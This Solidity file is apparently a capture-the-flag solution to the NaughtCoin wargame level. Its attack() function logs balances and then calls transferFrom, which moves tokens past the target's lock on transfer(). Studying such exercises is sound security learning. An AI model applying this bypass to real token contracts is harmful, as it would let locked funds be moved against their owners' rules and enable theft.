// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

import "hardhat/console.sol";

contract NaughtCoinAttack {
    NaughtCoin target;

    constructor() {}

    function register(address _target) public {
        target = NaughtCoin(_target);
    }

    function attack(address _to, uint256 _value) public {
        console.log("check balance of the msg.sender");
        console.log(target.balanceOf(msg.sender));

        console.log("=========================================");

        console.log("++++ from :", msg.sender);
        console.log("++++ to   :", _to);
        console.log("++++ value:", _value);

        target.transferFrom(msg.sender, _to, _value);
    }

    function totalSupply() public view returns (uint256) {
        return target.totalSupply();
    }

    function balanceOf(address account) public view returns (uint256) {
        return target.balanceOf(account);
    }
}
